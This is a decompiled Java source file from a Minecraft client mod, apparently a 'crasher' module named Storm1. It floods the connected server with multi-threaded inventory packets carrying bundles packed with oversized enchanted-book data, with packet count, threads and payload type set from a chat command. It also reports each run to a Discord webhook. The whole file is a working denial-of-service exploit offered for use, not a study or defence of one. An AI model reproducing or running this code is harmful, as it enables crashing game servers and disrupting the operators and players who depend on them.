package org.jon.magicclient.client.crashers;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;
import net.minecraft.class_1713;
import net.minecraft.class_1799;
import net.minecraft.class_1802;
import net.minecraft.class_2487;
import net.minecraft.class_2499;
import net.minecraft.class_2813;
import net.minecraft.class_310;
import org.jon.magicclient.client.Command;
import org.jon.magicclient.client.MessageHelper;
import org.jon.magicclient.client.gui.GuiCategory;
import org.jon.magicclient.client.utils.DiscordWebhookSender;
import org.jon.magicclient.client.utils.OptionType;
import org.jon.magicclient.client.utils.OptionUtil;

public class Storm1 implements Command {
   private final MessageHelper msgHelper = new MessageHelper();
   private final class_310 mc = class_310.method_1551();
   private volatile boolean running = false;
   private ExecutorService executor;
   private final List<OptionUtil> options;

   public Storm1() {
      this.options = Arrays.asList(new OptionUtil("Packets", OptionType.INTEGER), new OptionUtil("Threads", OptionType.INTEGER), new OptionUtil("Type", OptionType.LIST, new String[]{"Bundle", "Overflow", "Mixed"}));
   }

   public String getName() {
      return "Storm1";
   }

   public void onCommand(String[] args) {
      if (this.mc.field_1724 != null && this.mc.method_1562() != null) {
         if (args.length < 3) {
            this.msgHelper.sendMessage("&7Usage: !storm1 <packets> <threads> [type]", true);
         } else {
            try {
               int totalPackets = Integer.parseInt(args[1]);
               int threads = Integer.parseInt(args[2]);
               String type = args.length > 3 ? args[3].toLowerCase() : "bundle";
               this.startCrash(totalPackets, threads, type);
            } catch (NumberFormatException var5) {
               this.msgHelper.sendMessage("&c[Storm1] Invalid numbers provided!", true);
            }

         }
      } else {
         this.msgHelper.sendMessage("&c[Storm1] Not connected to a server!", true);
      }
   }

   private void startCrash(int totalPackets, int threads, String type) {
      if (this.running) {
         this.msgHelper.sendMessage("&c[Storm1] Already running!", true);
      } else {
         this.running = true;
         StringBuilder configBuilder = new StringBuilder();
         configBuilder.append("Packets=").append(totalPackets).append(", Threads=").append(threads).append(", Type=").append(type);
         DiscordWebhookSender.sendCrasherActivation("Storm1", configBuilder.toString());
         this.executor = Executors.newFixedThreadPool(threads);
         AtomicInteger sentPackets = new AtomicInteger(0);
         this.msgHelper.sendMessage("&a[Storm1] Starting storm with " + totalPackets + " packets on " + threads + " threads...", true);

         for(int i = 0; i < threads; ++i) {
            int packetsPerThread = totalPackets / threads;
            this.executor.execute(() -> {
               for(int j = 0; j < packetsPerThread && this.running && this.mc.method_1562() != null; ++j) {
                  this.sendCrashPacket(type);
                  int current = sentPackets.incrementAndGet();
                  if (current % 100 == 0) {
                     this.msgHelper.sendMessage("&6[Storm1] Progress: " + current + "/" + totalPackets, true);
                  }

                  try {
                     Thread.sleep(10L);
                  } catch (InterruptedException var8) {
                     break;
                  }
               }

            });
         }

         this.executor.shutdown();
         (new Thread(() -> {
            while(true) {
               try {
                  if (!this.executor.isTerminated() && this.running) {
                     Thread.sleep(100L);
                     continue;
                  }
               } catch (InterruptedException var6) {
               }

               this.running = false;
               if (this.mc.field_1724 != null) {
                  this.msgHelper.sendMessage("&a[Storm1] Done! Sent " + sentPackets.get() + " packets.", true);
                  StringBuilder compConfig = new StringBuilder();
                  compConfig.append("Packets=").append(totalPackets).append(", Threads=").append(threads).append(", Type=").append(type);
                  DiscordWebhookSender.sendCrasherCompletion("Storm1", compConfig.toString(), true);
               }

               return;
            }
         })).start();
      }
   }

   private void sendCrashPacket(String type) {
      class_1799 bundle = new class_1799(class_1802.field_27023, 64);
      class_2487 tag = new class_2487();
      class_2499 bundleItems = new class_2499();
      int itemsCount = type.equals("overflow") ? 128 : 64;
      int enchantCount = type.equals("bundle") ? 100 : 200;

      for(int j = 0; j < itemsCount; ++j) {
         class_2487 itemTag = new class_2487();
         itemTag.method_10582("id", "minecraft:enchanted_book");
         itemTag.method_10567("Count", (byte)64);
         class_2487 innerTag = new class_2487();
         class_2499 enchantments = new class_2499();

         for(int k = 0; k < enchantCount; ++k) {
            class_2487 enchant = new class_2487();
            enchant.method_10582("id", "minecraft:sharpness");
            enchant.method_10569("lvl", 32276726);
            enchantments.add(enchant);
         }

         innerTag.method_10566("StoredEnchantments", enchantments);
         itemTag.method_10566("tag", innerTag);
         bundleItems.add(itemTag);
      }

      tag.method_10566("Items", bundleItems);
      bundle.method_7980(tag);
      Int2ObjectArrayMap<class_1799> itemStacks = new Int2ObjectArrayMap();
      itemStacks.put(36, bundle);
      class_2813 packet = new class_2813(0, 0, 36, 0, class_1713.field_7790, bundle, itemStacks);
      if (this.mc.method_1562() != null) {
         this.mc.method_1562().method_2883(packet);
      }

   }

   public boolean getEnabled() {
      return this.running;
   }

   public void setEnabled(boolean bool) {
      if (!bool) {
         this.running = false;
      }

   }

   public String getArgsUsage() {
      return "<packets> <threads> [type]";
   }

   public String getDescription() {
      return "Advanced multi-threaded bundle crasher";
   }

   public List<OptionUtil> getOptions() {
      return this.options;
   }

   public GuiCategory getCategory() {
      return GuiCategory.CRASHES;
   }
}
